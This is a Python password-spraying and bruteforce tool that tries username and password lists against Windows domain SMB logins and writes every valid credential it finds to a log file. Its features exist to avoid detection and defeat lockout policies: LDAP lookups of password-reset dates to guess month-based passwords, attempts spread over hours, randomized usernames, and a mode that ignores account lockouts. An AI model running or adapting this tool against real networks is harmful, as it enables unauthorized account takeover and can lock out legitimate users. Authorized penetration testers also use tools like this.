#!/usr/bin/env python3
#
#  mmcbrute.py
#
#  Copyright 2017 Corey Gilks <CoreyGilks [at] gmail [dot] com>
#  Twitter: @CoreyGilks
#
#  2to3 and upgrades contributed by phx (https://github.com/phx)
#  Twitter: @rubynorails
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

import argparse
import datetime
import sys
import os
import pathlib
import logging
import logging.handlers
import time
import random
from collections import defaultdict

try:
	from impacket.smbconnection import SMBConnection
	from impacket.ldap import ldap, ldapasn1
	from impacket.krb5.ccache import CCache
except ImportError:
	print('You must install impacket before continuing')
	sys.exit(1)

try:
	import ldap3
except ImportError:
	print('You must install ldap3 for smart mode functionality: pip install ldap3')
	sys.exit(1)

# Check for MD4 availability (needed for NTLM auth)
def check_md4_support():
	"""Check if MD4 hash algorithm is available for NTLM authentication"""
	try:
		import hashlib
		hashlib.new('md4')
		return True
	except ValueError:
		return False

MD4_AVAILABLE = check_md4_support()
if not MD4_AVAILABLE:
	print('[!] Warning: MD4 hash algorithm not available. NTLM authentication may fail.')
	print('[!] Consider using SIMPLE authentication or enabling legacy crypto support.')

def get_timestamp():
	hmsp = datetime.datetime.now().strftime('%I:%M %p')
	tz = time.strftime('%Z')
	bdy = datetime.datetime.now().strftime('%B %d, %Y')
	return f"{hmsp} {tz} on {bdy}"

def is_readable_file(path):
	return os.path.isfile(path) and os.access(path, os.R_OK)

def convert_ad_timestamp(timestamp):
	"""Convert Active Directory timestamp to datetime object"""
	if timestamp == 0:
		return None
	# AD timestamp is 100-nanosecond intervals since Jan 1, 1601
	return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp/10)

def get_password_last_set_data(domain, ldap_user, ldap_pass, usernames, target):
	"""Query LDAP for pwdLastSet data for a list of usernames"""

	# Parse LDAP username - handle DOMAIN\username format
	if '\\' in ldap_user:
		ldap_domain, ldap_username = ldap_user.split('\\', 1)
	else:
		ldap_domain = domain
		ldap_username = ldap_user

	# Build LDAP connection
	server_name = target
	server = ldap3.Server(server_name, get_info=ldap3.ALL, connect_timeout=10)

	# Try multiple authentication methods
	auth_methods = []

	# Try NTLM first (only if MD4 is available)
	if MD4_AVAILABLE:
		try:
			if ldap_domain and ldap_domain != '.':
				bind_user = f"{ldap_domain}\\{ldap_username}"
			else:
				bind_user = ldap_username
			auth_methods.append(('NTLM', bind_user, ldap3.NTLM))
		except:
			pass

	# Add SIMPLE authentication as primary/fallback method
	if ldap_domain and ldap_domain != '.':
		simple_bind_user = f"{ldap_username}@{ldap_domain}"
	else:
		simple_bind_user = ldap_username
	auth_methods.append(('SIMPLE', simple_bind_user, ldap3.SIMPLE))

	# Also try just the username (some environments)
	if ldap_username != simple_bind_user:
		auth_methods.append(('SIMPLE_USERNAME', ldap_username, ldap3.SIMPLE))

	# Try authentication methods
	conn = None
	last_error = None

	for auth_name, bind_user, auth_type in auth_methods:
		try:
			conn = ldap3.Connection(server, user=bind_user, password=ldap_pass, authentication=auth_type)

			if conn.bind():
				print(f"[*] Successfully authenticated using {auth_name} method")
				break
			else:
				last_error = f"{auth_name} bind failed: {conn.result}"
				conn.unbind()
				conn = None
		except Exception as e:
			last_error = f"{auth_name} authentication error: {str(e)}"
			if conn:
				try:
					conn.unbind()
				except:
					pass
				conn = None

	if not conn:
		raise Exception(f"All authentication methods failed. Last error: {last_error}")

	try:
		# Get domain DN - handle different domain formats
		if domain and domain != '.':
			if '.' in domain:
				# FQDN format (domain.com)
				domain_dn = ','.join([f"DC={part}" for part in domain.split('.')])
			else:
				# NetBIOS format (DOMAIN)
				domain_dn = f"DC={domain},DC=local"
		else:
			# Try to get domain from server info
			if server.info and server.info.other.get('defaultNamingContext'):
				domain_dn = server.info.other['defaultNamingContext'][0]
			else:
				domain_dn = "DC=local"

		user_data = {}

		# Query each username
		for username in usernames:
			search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"

			try:
				conn.search(domain_dn, search_filter, attributes=['pwdLastSet', 'sAMAccountName'])

				if conn.entries:
					entry = conn.entries[0]
					pwd_last_set_value = entry.pwdLastSet.value if entry.pwdLastSet.value else None

					if pwd_last_set_value is None:
						last_set_date = None
					elif isinstance(pwd_last_set_value, datetime.datetime):
						# ldap3 already converted it to datetime
						last_set_date = pwd_last_set_value
					elif isinstance(pwd_last_set_value, (int, str)):
						# Raw AD timestamp - convert it
						pwd_last_set = int(pwd_last_set_value) if pwd_last_set_value else 0
						last_set_date = convert_ad_timestamp(pwd_last_set)
					else:
						print(f"[!] Unexpected pwdLastSet type for {username}: {type(pwd_last_set_value)} = {pwd_last_set_value}")
						last_set_date = None

					user_data[username] = last_set_date
				else:
					print(f"[!] User {username} not found in AD")
			except Exception as e:
				print(f"[!] Error querying user {username}: {str(e)}")

		conn.unbind()
		return user_data

	except Exception as e:
		if conn:
			try:
				conn.unbind()
			except:
				pass
		raise Exception(f"LDAP query failed: {str(e)}")

def get_top_months(user_data, top_count=3):
	"""Get the top N months based on when users set their passwords"""
	month_counts = defaultdict(int)

	for username, last_set_date in user_data.items():
		if last_set_date:
			month_key = last_set_date.strftime('%b').lower()  # jan, feb, mar, etc.
			month_counts[month_key] += 1

	# Sort by count descending and get top N
	sorted_months = sorted(month_counts.items(), key=lambda x: x[1], reverse=True)
	return [month for month, count in sorted_months[:top_count]]

def load_month_passwords(passpath, month):
	"""Load passwords from a month-specific file"""
	month_file = os.path.join(passpath, f"{month}.txt")
	if not is_readable_file(month_file):
		return []

	with open(month_file, 'r') as f:
		return [line.strip() for line in f if line.strip()]

class MMCBrute(object):
	def __init__(self, usernames, passwords, domain, target, output_log, output_creds,
	             user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO',
	             duration=None, randomize=False, smart=False, passpath=None,
	             ldapuser=None, ldappass=None):
		self.usernames = open(usernames, 'r')
		self.len_usernames = sum((1 for _ in self.usernames))
		self.usernames.seek(os.SEEK_SET)
		self.domain = domain
		self.target = target
		self.targets = [target]
		self.honeybadger = honeybadger
		self.verbose = verbose
		self.user_as_pass = user_as_pass
		self.output_log = output_log
		self.output_creds = output_creds
		self.logger = logging.getLogger(__name__)
		self.logger.setLevel(loglvl)
		self.formatter = logging.Formatter(f"{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} - %(message)s")
		self.logfilehandler = logging.handlers.RotatingFileHandler(
			self.output_log,
			maxBytes=10 * 1024 * 1024,
			backupCount=1,
			encoding=None,
			delay=0
		)
		self.consolehandler = logging.StreamHandler()
		self.consolehandler.setLevel(loglvl)
		self.consolehandler.setFormatter(logging.Formatter("%(message)s"))
		self.logfilehandler.setFormatter(self.formatter)
		self.logger.addHandler(self.logfilehandler)
		self.logger.addHandler(self.consolehandler)
		self.count = 0
		self.len_passwords = 0
		self.len_targets = 1
		self.duration = duration
		self.randomize = randomize
		self.start_time = None
		self.delay_between_attempts = 0
		self.smart = smart
		self.passpath = passpath
		self.ldapuser = ldapuser
		self.ldappass = ldappass
		self.user_password_map = {}  # Maps username to their specific password list
		self.passwords = None  # Initialize to None

		if passwords is not None:
			self.passwords = open(passwords, 'r')
			self.len_passwords = sum((1 for _ in self.passwords))
			self.passwords.seek(os.SEEK_SET)

		if self.user_as_pass and passwords is not None:
			self.len_passwords += 1
		elif self.user_as_pass:
			self.passwords = False
			self.len_passwords += 1

		if is_readable_file(self.target):
			self.targets = open(self.target, 'r')
			self.len_targets = sum((1 for _ in self.targets))
			self.targets.seek(os.SEEK_SET)

		# Smart mode initialization
		if self.smart:
			self.initialize_smart_mode()
			# For smart mode, calculate totals based on actual user-password combinations
			self.totals = sum(len(passwords) for passwords in self.user_password_map.values())
		else:
			self.totals = self.len_usernames * self.len_passwords

		if self.duration:
			duration_seconds = self.duration * 3600
			if self.totals > 1:
				self.delay_between_attempts = duration_seconds / (self.totals - 1)

	def initialize_smart_mode(self):
		"""Initialize smart mode by querying LDAP and setting up month-based password mapping"""
		self.logger.info(f"\033[94m[*] Smart mode enabled - querying LDAP for pwdLastSet data...\033[0m")

		# Get list of usernames
		self.usernames.seek(os.SEEK_SET)
		username_list = [user.strip() for user in self.usernames]

		try:
			# Query LDAP for password last set data
			user_data = get_password_last_set_data(
				self.domain, self.ldapuser, self.ldappass, username_list, self.target
			)

			# Get top 3 months
			top_months = get_top_months(user_data, 3)
			self.logger.info(f"\033[94m[*] Top 3 password reset months: {', '.join(top_months)}\033[0m")

			# Filter users to only those in top 3 months and build password mapping
			filtered_usernames = []
			total_password_attempts = 0

			for username, last_set_date in user_data.items():
				if last_set_date:
					month_key = last_set_date.strftime('%b').lower()
					if month_key in top_months:
						passwords = load_month_passwords(self.passpath, month_key)
						if passwords:
							self.user_password_map[username] = passwords
							filtered_usernames.append(username)
							total_password_attempts += len(passwords)
							self.logger.info(f"\033[94m[*] {username}: {last_set_date.strftime('%B %Y')} -> {len(passwords)} passwords from {month_key}.txt\033[0m")

			# Update username list and counts
			if filtered_usernames:
				self.len_usernames = len(filtered_usernames)
				self.len_passwords = total_password_attempts // self.len_usernames if self.len_usernames > 0 else 0
				self.logger.info(f"\033[94m[*] Filtered to {self.len_usernames} users based on top months\033[0m")
			else:
				self.logger.error(f"\033[91m[-] No users found in top 3 months or no password files available\033[0m")
				sys.exit(1)

		except Exception as e:
			self.logger.error(f"\033[91m[-] Smart mode initialization failed: {e}\033[0m")
			if "unsupported hash type MD4" in str(e) or "MD4" in str(e):
				self.logger.error(f"\033[91m[-] MD4 hash algorithm not available for NTLM authentication\033[0m")
				self.logger.error(f"\033[91m[-] Try one of these solutions:\033[0m")
				self.logger.error(f"\033[91m    1. Use SIMPLE authentication format: --ldapuser username@domain.com\033[0m")
				self.logger.error(f"\033[91m    2. Enable legacy crypto: export OPENSSL_CONF=/path/to/openssl_legacy.cnf\033[0m")
				self.logger.error(f"\033[91m    3. Install Python with MD4 support\033[0m")
			sys.exit(1)

	@classmethod
	def from_args(cls, args):
		return cls(args.usernames, args.passwords, args.domain, args.target, args.output_log,
		           args.output_creds, args.uap, args.hb, args.verbose, args.loglvl,
		           args.duration, args.randomize, args.smart, args.passpath,
		           args.ldapuser, args.ldappass)

	def update_progress(self):
		self.count += 1
		sys.stdout.write(f"\033[93m[+] Progress:\t\t{self.count}/{self.totals} ({round((100 * self.count / self.totals), 2)}%) {' ' * 10}\r\033[0m")
		sys.stdout.flush()

	def write_creds(self, msg=None):
		with open(self.output_creds, 'a') as f:
			f.write(f"{msg}\n")

	def run(self):
		self.start_time = time.time()

		for target in self.targets:
			target = target.strip()
			self.target = target

			if self.smart:
				# Smart mode: maintain password-by-password spray pattern
				username_list = list(self.user_password_map.keys())
				if self.randomize:
					random.shuffle(username_list)

				# Build unique password list from all users' month-based passwords
				all_passwords = set()
				for user_passwords in self.user_password_map.values():
					all_passwords.update(user_passwords)

				password_list = list(all_passwords)

				# Spray each password across all relevant users
				for password in password_list:
					for user in username_list:
						# Only try this password if it's in this user's specific month list
						if password in self.user_password_map[user]:
							if self.duration and self.count > 0:
								time.sleep(self.delay_between_attempts)
							self.update_progress()
							self.login(self.target, self.domain, user, password)

			else:
				# Normal mode: use password file
				username_list = [user.strip() for user in self.usernames]
				if self.randomize:
					random.shuffle(username_list)

				# Password attempts - go through all users for each password
				if self.passwords:
					self.passwords.seek(os.SEEK_SET)
					password_list = [password.strip() for password in self.passwords]

					for password in password_list:
						for user in username_list:
							if self.duration and self.count > 0:
								time.sleep(self.delay_between_attempts)
							self.update_progress()
							self.login(self.target, self.domain, user, password)

	def login(self, target, domain, username, password):
		attempt = f"{domain}/{username}:{password}"
		smb_connection = None
		try:
			# Create a fresh SMB connection for each login attempt
			smb_connection = SMBConnection(target, target)
			# This line will always raise an exception unless the credentials can initiate an smb connection
			smb_connection.login(username, password, domain)
			self.logger.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m")
			self.write_creds(attempt)
			return True

		except Exception as msg:
			msg = str(msg)
			if 'STATUS_NO_LOGON_SERVERS' in msg:
				self.logger.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m")
				sys.exit(1)

			elif 'STATUS_LOGON_FAILURE' in msg:
				if self.verbose:
					self.logger.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m")
				return False

			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
				self.logger.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m")
				if not self.honeybadger:
					self.logger.info(
						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
					answer = str(input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
					if answer.lower() in ["y", "yes", ""]:
						self.logger.info('\033[93m[*] Resuming...')
						return False
					else:
						self.logger.info('\033[91m[-]Exiting...')
						sys.exit(1)

			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
				self.logger.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
				self.logger.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_PASSWORD_EXPIRED' in msg:
				self.logger.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_ACCOUNT_DISABLED' in msg:
				self.logger.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m")

			else:
				self.logger.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m")
			return True

		finally:
			# Ensure connection is always closed
			if smb_connection:
				try:
					smb_connection.close()
				except:
					pass

	def end(self):
		print() # (Cleans up output and log)
		self.logger.info(f"\033[93mFinished at:\t\t{get_timestamp()}\033[0m")

		# Close file handles that exist
		file_handles = []
		if hasattr(self, 'usernames') and self.usernames:
			file_handles.append(self.usernames)
		if hasattr(self, 'target') and hasattr(self.target, 'close'):
			file_handles.append(self.target)
		if hasattr(self, 'passwords') and self.passwords:
			file_handles.append(self.passwords)

		for f in file_handles:
			try:
				f.close()
			except (AttributeError, TypeError):
				pass

	def info(self):
		self.logger.info(f"\033[93mStarted at:\t\t{get_timestamp()}\033[0m")
		self.logger.info(f"\033[94mTarget:\t\t\t{self.target}\033[0m")
		self.logger.info(f"\033[94mTarget count:\t\t{self.len_targets}\033[0m")
		self.logger.info(f"\033[94mUsername count:\t\t{self.len_usernames}\033[0m")
		self.logger.info(f"\033[94mPassword count:\t\t{self.len_passwords}\033[0m")
		self.logger.info(f"\033[94mEstimated attempts:\t{self.totals}\033[0m")
		self.logger.info(f"\033[94mUser-as-Pass Mode:\t{self.user_as_pass}\033[0m")
		self.logger.info(f"\033[94mHoney Badger Mode:\t{self.honeybadger}\033[0m")
		self.logger.info(f"\033[94mVerbose Mode:\t\t{self.verbose}\033[0m")
		if self.duration:
			self.logger.info(f"\033[94mDuration Mode:\t\t{self.duration} hours\033[0m")
			self.logger.info(f"\033[94mDelay per attempt:\t{self.delay_between_attempts:.2f} seconds\033[0m")
		self.logger.info(f"\033[94mRandomize Usernames:\t{self.randomize}\033[0m")
		self.logger.info(f"\033[94mSmart Mode:\t\t{self.smart}\033[0m")
		if self.smart:
			self.logger.info(f"\033[94mPassword Path:\t\t{self.passpath}\033[0m")
			self.logger.info(f"\033[94mLDAP User:\t\t{self.ldapuser}\033[0m")

if __name__ == '__main__':
	script_path = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_path)

	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
	group = parser.add_argument_group('Bruteforce options')
	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address or path to text file containing IPs')
	group.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')
	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Password or path to text file containing passwords')
	group.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')
	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Path to text file containing usernames')
	group.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')
	group.add_argument('-o', '--output', action='store', dest='output_log', default='./logs/mmcbrute.log', help='Path to output logfile')
	group.add_argument('-c', '--creds', action='store', dest='output_creds', default='./logs/creds.log', help='Path to output creds file')
	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
	group.add_argument('--duration', action='store', type=float, dest='duration', help='Duration in hours to spread out spray attempts')
	group.add_argument('--randomize', action='store_true', dest='randomize', help='Randomize the order of usernames from the -u list')
	group.add_argument('--smart', action='store_true', dest='smart', help='Enable smart mode: query pwdLastSet and use month-based password files')
	group.add_argument('--passpath', action='store', dest='passpath', help='Directory path containing monthly password files (jan.txt, feb.txt, etc.) - required with --smart')
	group.add_argument('--ldapuser', action='store', dest='ldapuser', help='LDAP username for querying pwdLastSet (format: DOMAIN\\username or username@domain.com)')
	group.add_argument('--ldappass', action='store', dest='ldappass', help='LDAP password for authentication')
	options = parser.parse_args()
	output_log = options.output_log
	output_creds = options.output_creds

	if not options.smart and options.passwords is None and options.uap is False:
		parser.error('The --passwords or --user-as-pass option is required (unless using --smart mode)')

	if not is_readable_file(options.usernames):
		parser.error('The --usernames option must be a readable file')

	if options.passwords is not None and not is_readable_file(options.passwords):
		parser.error('The --passwords option must be a readable file')

	# Smart mode validation
	if options.smart:
		if not options.passpath:
			parser.error('--passpath is required when using --smart mode')
		if not options.ldapuser:
			parser.error('--ldapuser is required when using --smart mode')
		if not options.ldappass:
			parser.error('--ldappass is required when using --smart mode')
		if not os.path.isdir(options.passpath):
			parser.error('--passpath must be a valid directory path')

	if options.passpath and not options.smart:
		parser.error('--passpath can only be used with --smart mode')
	if options.ldapuser and not options.smart:
		parser.error('--ldapuser can only be used with --smart mode')
	if options.ldappass and not options.smart:
		parser.error('--ldappass can only be used with --smart mode')

	# Make sure logs directory exists:
	pathlib.Path('./logs').mkdir(exist_ok=True)

	brute = MMCBrute.from_args(options)
	try:
		brute.info()
		brute.run()
	except KeyboardInterrupt:
		print('\033[94m\n[*] Caught ctrl-c, exiting')
	finally:
		brute.end()
